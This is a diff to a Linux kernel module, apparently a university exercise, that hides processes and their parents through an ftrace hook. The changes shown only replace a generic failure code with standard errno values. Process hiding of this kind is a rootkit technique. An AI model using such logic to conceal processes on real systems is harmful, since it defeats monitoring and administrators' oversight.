@@ -10,7 +10,7 @@
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("National Cheng Kung University, Taiwan");
 
-enum RETURN_CODE { SUCCESS, FAIL };
+enum RETURN_CODE { SUCCESS};
 
 struct ftrace_hook {
     const char *name;
@@ -121,11 +121,11 @@ static pid_t get_parent_pid(pid_t pid)
 	
 	realPID = find_get_pid(pid);
 	if(!realPID)
-			return -FAIL;
+			return -EINVAL;
 
 	ts = get_pid_task(realPID, PIDTYPE_PID);
 	if(!ts)
-			return -FAIL;
+			return -EINVAL;
 
     printk(KERN_INFO "@ %s parent_id : %d\n", __func__, ts->real_parent->pid);
     return ts->real_parent->pid;
@@ -137,7 +137,7 @@ static int hide_process(pid_t pid)
     pid_node_t *proc, *tmp_proc;
     list_for_each_entry_safe (proc, tmp_proc, &hidden_proc, list_node) {
 			if(proc->id == pid)
-					return -FAIL;
+					return -EEXIST;
     }
 
     proc = kmalloc(sizeof(pid_node_t), GFP_KERNEL);
@@ -154,7 +154,7 @@ static int hide_parent_process(pid_t pid)
 	parent_id = get_parent_pid(pid);
     printk(KERN_INFO "@ %s got ppid: %d\n", __func__, parent_id);
 	if(parent_id < 0)
-			return FAIL;
+			return parent_id;
 
     return hide_process(parent_id);
 }
@@ -175,7 +175,7 @@ static int unhide_parent_process(pid_t pid)
 
 	parent_id = get_parent_pid(pid);
 	if(parent_id < 0)
-			return FAIL;
+			return parent_id;
 
     return unhide_process(parent_id);
 }
